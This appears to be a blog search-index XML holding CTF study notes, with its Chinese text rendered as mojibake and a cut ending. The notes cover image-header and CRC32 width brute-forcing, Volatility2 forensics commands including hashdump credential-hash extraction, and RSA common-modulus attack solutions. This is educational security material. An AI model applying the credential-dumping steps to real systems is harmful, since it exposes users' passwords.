<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>å¸¸è§å›¾ç‰‡å®½é«˜ä¿®æ”¹</title>
      <link href="/2023/10/21/%E5%B8%B8%E8%A7%81%E5%9B%BE%E7%89%87%E5%AE%BD%E9%AB%98%E4%BF%AE%E6%94%B9/"/>
      <url>/2023/10/21/%E5%B8%B8%E8%A7%81%E5%9B%BE%E7%89%87%E5%AE%BD%E9%AB%98%E4%BF%AE%E6%94%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="BMPå›¾ç‰‡"><a href="#BMPå›¾ç‰‡" class="headerlink" title="BMPå›¾ç‰‡"></a>BMPå›¾ç‰‡</h1><p><img src="https://imag.keyblue.cn/imag/202310171351008.png" alt="image-20231017135138955"></p><ul><li>æ–‡ä»¶ç±»å‹</li></ul><blockquote><p>å‰ä¸¤ä¸ªå­—èŠ‚ä¸º<code>42 4D</code>å­—ç¬¦ä¸º<code>BM</code></p></blockquote><ul><li>æ–‡ä»¶å¤§å°</li></ul><blockquote><p>å 4ä¸ªå­—èŠ‚ï¼Œå¦‚å›¾ä¸­<code>A6 4E 12 00</code>ï¼Œé¢ å€’åä¸º<code>00 12 4E A6</code>ï¼Œæ‰€ä»¥è¯¥å›¾ç‰‡çš„å¤§å°ä¸º1199782å­—èŠ‚</p></blockquote><ul><li>å›¾ç‰‡å®½åº¦</li></ul><blockquote><p>å 4ä¸ªå­—èŠ‚ï¼Œå¦‚å›¾ä¸­<code>7A 03 00 00</code>ï¼Œé¢ å€’åä¸º<code>00 00 03 7A</code>ï¼Œæ‰€ä»¥è¯¥å›¾ç‰‡å®½åº¦ä¸º890åƒç´ ï¼Œçº¦ç­‰äº<code>æ–‡ä»¶å¤§å°(00 12 4E A6) / 3 / é«˜åº¦(00 00 01 C1)</code></p></blockquote><ul><li>å›¾ç‰‡é«˜åº¦</li></ul><blockquote><p>å 4ä¸ªå­—èŠ‚ï¼Œå¦‚å›¾ä¸­<code>C1  01 00 00</code>ï¼Œé¢ å€’åä¸º<code>00 00 01 C1</code>ï¼Œæ‰€ä»¥è¯¥å›¾ç‰‡çš„é«˜åº¦ä¸º449åƒç´ ï¼Œçº¦ç­‰äº<code>æ–‡ä»¶å¤§å°(00 12 4E A6) / 3 / å®½åº¦(00 00 03 7A)</code></p></blockquote><h1 id="PNGå›¾ç‰‡"><a href="#PNGå›¾ç‰‡" class="headerlink" title="PNGå›¾ç‰‡"></a>PNGå›¾ç‰‡</h1><p><img src="https://imag.keyblue.cn/imag/202310171514746.png" alt="image-20231017151428710"></p><ul><li>æ–‡ä»¶ç±»å‹</li></ul><blockquote><p>å 8ä¸ªå­—èŠ‚ï¼Œä¸ºpngçš„æ–‡ä»¶å¤´ï¼š<code>89 50 4E 47 0D 0A 1A 0A </code>ï¼Œå›ºå®šæ ¼å¼</p></blockquote><ul><li>å›¾ç‰‡å®½åº¦</li></ul><blockquote><p>å 4ä¸ªå­—èŠ‚ï¼Œå¦‚å›¾<code>00 00 04 14</code>ï¼Œå›¾ç‰‡é«˜åº¦ä¸º1044åƒç´ </p></blockquote><ul><li>å›¾ç‰‡é«˜åº¦</li></ul><blockquote><p>å 4ä¸ªå­—èŠ‚ï¼Œå¦‚å›¾<code>00 00 00 96</code>ï¼Œå›¾ç‰‡é«˜åº¦ä¸º150åƒç´ </p></blockquote><ul><li>CRC32æ ¡éªŒå—</li></ul><blockquote><p>å 4ä¸ªå­—èŠ‚ï¼Œå¦‚å›¾<code>E1 4A 4C 0B</code>ï¼Œå€¼ç”±ä»ç¬¬12ä¸ªå­—èŠ‚åˆ°ç¬¬28ä¸ªå­—èŠ‚çš„åä¸ƒä½å­—èŠ‚è¿›è¡Œcrcè®¡ç®—å¾—åˆ°</p></blockquote><p>PNGå›¾ç‰‡è¦è®¡ç®—æ­£ç¡®çš„å®½é«˜éœ€è¦è¿›è¡ŒCRC32çˆ†ç ´</p><p>CRC32çˆ†ç ´è„šæœ¬ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> struct<span class="token keyword">import</span> binascii m <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./res/misc.png"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>k<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> k<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        c <span class="token operator">=</span> m<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">+</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'>i'</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span> <span class="token operator">+</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'>i'</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token operator">+</span>m<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">]</span>        crc <span class="token operator">=</span> binascii<span class="token punctuation">.</span>crc32<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span>        <span class="token keyword">if</span> crc <span class="token operator">==</span> <span class="token number">0x889C2F07</span><span class="token punctuation">:</span>        <span class="token comment">#ç›®æ ‡å›¾ç‰‡å¯¹åº”çš„crcå€¼</span>            k <span class="token operator">=</span> <span class="token number">1</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="JPGå›¾ç‰‡"><a href="#JPGå›¾ç‰‡" class="headerlink" title="JPGå›¾ç‰‡"></a>JPGå›¾ç‰‡</h1>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Volatility2å†…å­˜å–è¯å¸¸ç”¨å‘½ä»¤</title>
      <link href="/2023/10/21/Volatility2%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/10/21/Volatility2%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="æŸ¥çœ‹é•œåƒä¿¡æ¯-imageinfo"><a href="#æŸ¥çœ‹é•œåƒä¿¡æ¯-imageinfo" class="headerlink" title="æŸ¥çœ‹é•œåƒä¿¡æ¯(imageinfo)"></a>æŸ¥çœ‹é•œåƒä¿¡æ¯(imageinfo)</h2><p>é¦–å…ˆä½¿ç”¨<code>-f</code>é€‰é¡¹æ¥é€‰æ‹©é•œåƒæ–‡ä»¶</p><p>è¾“å…¥å‘½ä»¤ï¼Œä»¥ä¸‹å‘½ä»¤ç”¨æ¥æŸ¥çœ‹é•œåƒçš„ç³»ç»Ÿä¿¡æ¯</p><pre class="line-numbers language-none"><code class="language-none">volatility -f 1.dmp imageinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¾“å‡º</p><pre class="line-numbers language-none"><code class="language-none">Volatility Foundation Volatility Framework 2.6INFO    : volatility.debug    : Determining profile based on KDBG search...          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)                     AS Layer2 : FileAddressSpace (&#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;è®¡ç®—æœºå–è¯&#x2F;1.dmp)                      PAE type : No PAE                           DTB : 0x187000L                          KDBG : 0xf80003ffa0a0L          Number of Processors : 1     Image Type (Service Pack) : 1                KPCR for CPU 0 : 0xfffff80003ffbd00L             KUSER_SHARED_DATA : 0xfffff78000000000L           Image date and time : 2022-04-28 05:54:55 UTC+0000     Image local date and time : 2022-04-28 13:54:55 +0800<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ‘ä»¬æŸ¥çœ‹åˆ°äº†<code>Win7SP1x64</code>,è¿™ä¸ªä¿¡æ¯åœ¨åé¢çš„æ“ä½œéƒ½ä¼šç”¨åˆ°</p><h2 id="ç¡®å®šç³»ç»Ÿ-â€“profile"><a href="#ç¡®å®šç³»ç»Ÿ-â€“profile" class="headerlink" title="ç¡®å®šç³»ç»Ÿ(â€“profile&#x3D;)"></a>ç¡®å®šç³»ç»Ÿ(â€“profile&#x3D;)</h2><p>çœ‹åˆ°äº†ç³»ç»Ÿä¿¡æ¯ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥ç¡®å®šäº†</p><pre class="line-numbers language-none"><code class="language-none">volatility -f 1.dmp --profile&#x3D;Win7SP1x64 imageinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æƒ³è¦è¿›è¡Œè¿›ä¸€æ­¥æ“ä½œï¼Œéœ€è¦æŒ‡å®š<code>profile</code>å‚æ•°</p><h2 id="æŸ¥çœ‹å¯†ç çš„MD5å€¼-hashdump"><a href="#æŸ¥çœ‹å¯†ç çš„MD5å€¼-hashdump" class="headerlink" title="æŸ¥çœ‹å¯†ç çš„MD5å€¼(hashdump)"></a>æŸ¥çœ‹å¯†ç çš„MD5å€¼(hashdump)</h2><pre class="line-numbers language-none"><code class="language-none">volatility -f 1.dmp --profile&#x3D;Win7SP1x64 hashdump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä½¿ç”¨æ­¤å‘½ä»¤å¯ä»¥æŸ¥çœ‹åˆ°windowsçš„ç”¨æˆ·åæ˜æ–‡å’Œå¯†ç çš„md5å€¼</p><p><img src="https://imag.keyblue.cn/imag/202309011510720.png" alt="image-20230901151036671"></p><p>å¦‚å›¾ï¼Œ<code>7f21caca5685f10d9e849cc84c340528</code>æ˜¯ç”¨æˆ·taqi7çš„å¯†ç çš„md5å€¼</p><h2 id="æŸ¥çœ‹IEè®°å½•-iehistory"><a href="#æŸ¥çœ‹IEè®°å½•-iehistory" class="headerlink" title="æŸ¥çœ‹IEè®°å½•(iehistory)"></a>æŸ¥çœ‹IEè®°å½•(iehistory)</h2><pre class="line-numbers language-none"><code class="language-none">volatility -f 1.raw --profile&#x3D;WinXPSP2x86 iehistory<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imag.keyblue.cn/imag/202309041455706.png" alt="image-20230904145506659"></p><h2 id="æŸ¥æ‰¾æ–‡ä»¶-fliescan"><a href="#æŸ¥æ‰¾æ–‡ä»¶-fliescan" class="headerlink" title="æŸ¥æ‰¾æ–‡ä»¶(fliescan)"></a>æŸ¥æ‰¾æ–‡ä»¶(fliescan)</h2><pre class="line-numbers language-none"><code class="language-none">volatility -f 1.raw --profile&#x3D;WinXPSP2x86 fliescan<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imag.keyblue.cn/imag/202309041500087.png" alt="image-20230904150030043"></p><p>åŠ ä¸Šç®¡é“ç¬¦å¯ä»¥ç²¾ç¡®æŸ¥æ‰¾ç›®æ ‡æ–‡ä»¶</p><pre class="line-numbers language-none"><code class="language-none">volatility -f 1.raw --profile&#x3D;WinXPSP2x86 fliescan | grep ssh.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imag.keyblue.cn/imag/202309041502213.png" alt="image-20230904150218179"></p><h2 id="æ–‡ä»¶ä¸‹è½½-dumpfiles"><a href="#æ–‡ä»¶ä¸‹è½½-dumpfiles" class="headerlink" title="æ–‡ä»¶ä¸‹è½½(dumpfiles)"></a>æ–‡ä»¶ä¸‹è½½(dumpfiles)</h2><pre class="line-numbers language-none"><code class="language-none">volatility -f 1.raw --profile&#x3D;WinXPSP2x86 dumpfiles -Q 0x00000000020bf6a0 -D .&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imag.keyblue.cn/imag/202309041505277.png" alt="image-20230904150504247"></p><p>æ ¹æ®æ–‡ä»¶æŸ¥æ‰¾åˆ°çš„-Qå‚æ•°æ‰èƒ½è¿›è¡Œæ–‡ä»¶ä¸‹è½½</p><h2 id="å†å²å‘½ä»¤-cmdscan"><a href="#å†å²å‘½ä»¤-cmdscan" class="headerlink" title="å†å²å‘½ä»¤(cmdscan)"></a>å†å²å‘½ä»¤(cmdscan)</h2><pre class="line-numbers language-none"><code class="language-none">volatility -f 1.raw --profile&#x3D;WinXPSP2x86 cmdscan<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imag.keyblue.cn/imag/202309041542425.png" alt="image-20230904154233373"></p><p>PowerShellå†å²å‘½ä»¤æ–‡ä»¶è·¯å¾„ä¸ºï¼š<code>%USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code> ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥å»filescan<code>ConsoleHost_history.txt</code></p><h2 id="ç½‘ç»œè¿æ¥ä¿¡æ¯-netscan"><a href="#ç½‘ç»œè¿æ¥ä¿¡æ¯-netscan" class="headerlink" title="ç½‘ç»œè¿æ¥ä¿¡æ¯(netscan)"></a>ç½‘ç»œè¿æ¥ä¿¡æ¯(netscan)</h2><pre class="line-numbers language-none"><code class="language-none">volatility -f 1.raw --profile&#x3D;WinXPSP2x86 netscan<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä½¿ç”¨æ­¤å‘½ä»¤å¯ä»¥æŸ¥çœ‹æœ¬æœºipåœ°å€ä»¥åŠè¿›ç¨‹çš„ç½‘ç»œè¿æ¥</p><h2 id="å¯¼å‡ºè¿›ç¨‹å†…å­˜æ•°æ®-memdump"><a href="#å¯¼å‡ºè¿›ç¨‹å†…å­˜æ•°æ®-memdump" class="headerlink" title="å¯¼å‡ºè¿›ç¨‹å†…å­˜æ•°æ®(memdump)"></a>å¯¼å‡ºè¿›ç¨‹å†…å­˜æ•°æ®(memdump)</h2><pre class="line-numbers language-none"><code class="language-none">volatility -f OtterCTF.vmem --profile&#x3D;Win7SP1x64 memdump --pid&#x3D;&#39;708&#39; --dump-dir&#x3D;.&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯¼å‡ºåå¯ç”¨<code>strings</code>æŒ‡ä»¤æ¥æŸ¥çœ‹æ•°æ®ï¼Œå¹¶ä½¿ç”¨<code>grep</code>æŒ‡ä»¤æ¥ç­›é€‰ï¼Œæ·»åŠ <code>-C</code>çš„é€‰é¡¹ç”¨æ¥æ˜¾ç¤ºåŒ¹é…å†…å®¹çš„åNè¡Œå†…å®¹ï¼Œä¾‹å¦‚ï¼š</p><pre class="line-numbers language-none"><code class="language-none">strings 708.dmp | grep &#39;Lunar-3&#39; -C 10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æˆ–è€…ä½¿ç”¨<code>xxd</code>æŒ‡ä»¤æ‰“å°æ–‡ä»¶çš„hexdumpä¿¡æ¯ï¼Œä¾‹å¦‚ï¼š</p><pre class="line-numbers language-none"><code class="language-none">xxd 708.dmp | grep &#39;5a0c 0000&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="æ³¨å†Œè¡¨ä¿¡æ¯-hivelist"><a href="#æ³¨å†Œè¡¨ä¿¡æ¯-hivelist" class="headerlink" title="æ³¨å†Œè¡¨ä¿¡æ¯(hivelist)"></a>æ³¨å†Œè¡¨ä¿¡æ¯(hivelist)</h2><pre class="line-numbers language-none"><code class="language-none">volatility -f OtterCTF.vmem --profile&#x3D;Win7SP1x64 hivelist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imag.keyblue.cn/imag/202310091657372.png" alt="image-20231009165709332"></p><h2 id="ä¸»æœºå"><a href="#ä¸»æœºå" class="headerlink" title="ä¸»æœºå"></a>ä¸»æœºå</h2><p>ä¸»æœºåä¼šå‡ºå‚¨å­˜åœ¨<code>\REGISTRY\MACHINE\SYSTEM</code>ä¸­çš„<code>ControlSet001\Control\ComputerName\ComputerName</code>æ¡ç›®ä¸­ï¼Œå¯ä»¥ç›´æ¥è¯»å–</p><p>å…ˆä½¿ç”¨<code>hivelist</code>æŸ¥çœ‹<code>\REGISTRY\MACHINE\SYSTEM</code>çš„<code>Virtual</code>å€¼ï¼Œå†ä½¿ç”¨å¦‚ä¸‹åç§°å³å¯æŸ¥çœ‹ä¸»æœºå</p><pre class="line-numbers language-none"><code class="language-none">volatility -f OtterCTF.vmem --profile&#x3D;Win7SP1x64 -o 0xfffff8a000024010 printkey -K &quot;ControlSet001\Control\ComputerName\ComputerName&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imag.keyblue.cn/imag/202310091701626.png" alt="image-20231009170123583"></p><h2 id="ç²˜è´´æ¿-clipboard"><a href="#ç²˜è´´æ¿-clipboard" class="headerlink" title="ç²˜è´´æ¿(clipboard)"></a>ç²˜è´´æ¿(clipboard)</h2><pre class="line-numbers language-none"><code class="language-none">volatility -f OtterCTF.vmem --profile&#x3D;Win7SP1x64 clipboard<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç®€è€Œè¨€ä¹‹ï¼ŒæŸ¥çœ‹ç²˜è´´æ¿ä¿¡æ¯</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Volatility2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF Cryptoæ¨¡å—åšé¢˜è®°å½•</title>
      <link href="/2023/09/25/NSSCTF%20Crypto%E6%A8%A1%E5%9D%97%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/09/25/NSSCTF%20Crypto%E6%A8%A1%E5%9D%97%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="AFCTF-2018-å¯æ€œçš„RSA"><a href="#AFCTF-2018-å¯æ€œçš„RSA" class="headerlink" title="[AFCTF 2018]å¯æ€œçš„RSA"></a>[AFCTF 2018]å¯æ€œçš„RSA</h1><p>ç»™äº†<code>flag.enc</code>ã€<code>public.key</code></p><p>å…ˆä»public.keyè·å–nå’Œeçš„å€¼</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./res/å¯æ€œçš„RSA/public.key'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    pubkey <span class="token operator">=</span> RSA<span class="token punctuation">.</span>importKey<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>n <span class="token operator">=</span> pubkey<span class="token punctuation">.</span>ne <span class="token operator">=</span> pubkey<span class="token punctuation">.</span>e<span class="token keyword">print</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¾—åˆ°äº†nå’Œeçš„å€¼ï¼Œéœ€è¦å¯¹n<a href="http://www.factordb.com/">å› å¼åˆ†è§£</a></p><pre class="line-numbers language-none"><code class="language-none">p &#x3D; 3133337q &#x3D; 25478326064937419292200172136399497719081842914528228316455906211693118321971399936004729134841162974144246271486439695786036588117424611881955950996219646807378822278285638261582099108339438949573034101215141156156408742843820048066830863814362379885720395082318462850002901605689761876319151147352730090957556940842144299887394678743607766937828094478336401159449035878306853716216548374273462386508307367713112073004011383418967894930554067582453248981022011922883374442736848045920676341361871231787163441467533076890081721882179369168787287724769642665399992556052144845878600126283968890273067575342061776244939<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>çŸ¥é“äº†pğŸ˜­qï¼Œç”¨powå‡½æ•°è®¡ç®—ç§é’¥</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">phi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> phi<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¯»å–å¯†æ–‡åè¦å…ˆbase64è§£ç </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64 <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./res/å¯æ€œçš„RSA/flag.enc'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    c <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    c <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æœ€ç»ˆexpï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> PKCS1_OAEP<span class="token keyword">import</span> base64 <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./res/å¯æ€œçš„RSA/public.key'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    pubkey <span class="token operator">=</span> RSA<span class="token punctuation">.</span>importKey<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>n <span class="token operator">=</span> pubkey<span class="token punctuation">.</span>ne <span class="token operator">=</span> pubkey<span class="token punctuation">.</span>ep <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>q <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> phi<span class="token punctuation">)</span>key <span class="token operator">=</span> RSA<span class="token punctuation">.</span>construct<span class="token punctuation">(</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> e<span class="token punctuation">,</span> d<span class="token punctuation">,</span> p<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">)</span>key <span class="token operator">=</span> PKCS1_OAEP<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./res/å¯æ€œçš„RSA/flag.enc'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    c <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    c <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>c<span class="token punctuation">)</span>m <span class="token operator">=</span> key<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="BJDCTF-2020-rsa-output"><a href="#BJDCTF-2020-rsa-output" class="headerlink" title="[BJDCTF 2020]rsa_output"></a>[BJDCTF 2020]rsa_output</h1><p>ç»™äº†ä¸€å¤§ä¸²æ•°æ®</p><p>å¾ˆæ˜æ˜¾è¿™æ˜¯è¦ç”¨åˆ°å…±æ¨¡æ”»å‡»</p><blockquote><p><strong>å…±æ¨¡æ˜¯æŒ‡</strong>ï¼šå°±æ˜¯æ˜æ–‡m,ç›¸åŒã€‚ç”¨ä¸¤ä¸ªå…¬é’¥e1,e2åŠ å¯†å¾—åˆ°ä¸¤ä¸ªç§é’¥d1,d2 å’Œä¸¤ä¸ªå¯†æ–‡c1,c2<br> <strong>å…±æ¨¡æ”»å‡»</strong>ï¼šå³å½“mä¸å˜çš„æƒ…å†µä¸‹ï¼ŒçŸ¥é“n,e1,e2,c1,c2, å¯ä»¥åœ¨ä¸çŸ¥é“d1,d2çš„æƒ…å†µä¸‹ï¼Œè§£å‡ºm</p><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://www.cnblogs.com/gwind/p/8013154.html">https://www.cnblogs.com/gwind/p/8013154.html</a></p></blockquote><p>å…ˆäº†è§£ä¸€ä¸‹æ‹“å±•æ¬§å‡ é‡Œå¾—</p><blockquote><p>å±•æ¬§å‡ é‡Œå¾—ç®—æ³•ï¼ˆç®€ç§°<strong>æ‰©æ¬§</strong>ï¼‰æ˜¯æ¬§å‡ é‡Œå¾—ç®—æ³•ï¼ˆåˆç§°è¾—è½¬ç›¸é™¤æ³•ï¼‰çš„æ‰©å±•ã€‚æ‰©æ¬§å¯ä»¥åœ¨æ±‚å¾— aã€bçš„æœ€å¤§å…¬çº¦æ•°çš„åŒæ—¶ï¼Œèƒ½æ‰¾åˆ°æ•´æ•° xã€yï¼Œä½¿å®ƒä»¬æ»¡è¶³è´ç¥–ç­‰å¼ï¼šax+by &#x3D; gcd(a, b) </p></blockquote><p>æœ€ç»ˆpayloadï¼š </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> gmpy2n <span class="token operator">=</span> <span class="token number">21058339337354287847534107544613605305015441090508924094198816691219103399526800112802416383088995253908857460266726925615826895303377801614829364034624475195859997943146305588315939130777450485196290766249612340054354622516207681542973756257677388091926549655162490873849955783768663029138647079874278240867932127196686258800146911620730706734103611833179733264096475286491988063990431085380499075005629807702406676707841324660971173253100956362528346684752959937473852630145893796056675793646430793578265418255919376323796044588559726703858429311784705245069845938316802681575653653770883615525735690306674635167111</span>e1 <span class="token operator">=</span> <span class="token number">2767</span>e2 <span class="token operator">=</span> <span class="token number">3659</span>message1<span class="token operator">=</span><span class="token number">20152490165522401747723193966902181151098731763998057421967155300933719378216342043730801302534978403741086887969040721959533190058342762057359432663717825826365444996915469039056428416166173920958243044831404924113442512617599426876141184212121677500371236937127571802891321706587610393639446868836987170301813018218408886968263882123084155607494076330256934285171370758586535415136162861138898728910585138378884530819857478609791126971308624318454905992919405355751492789110009313138417265126117273710813843923143381276204802515910527468883224274829962479636527422350190210717694762908096944600267033351813929448599</span>message2<span class="token operator">=</span><span class="token number">11298697323140988812057735324285908480504721454145796535014418738959035245600679947297874517818928181509081545027056523790022598233918011261011973196386395689371526774785582326121959186195586069851592467637819366624044133661016373360885158956955263645614345881350494012328275215821306955212788282617812686548883151066866149060363482958708364726982908798340182288702101023393839781427386537230459436512613047311585875068008210818996941460156589314135010438362447522428206884944952639826677247819066812706835773107059567082822312300721049827013660418610265189288840247186598145741724084351633508492707755206886202876227</span><span class="token comment"># æ‹“å±•æ¬§å‡ é‡Œå¾—</span>s<span class="token punctuation">,</span> s1<span class="token punctuation">,</span> s2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcdext<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>message1<span class="token 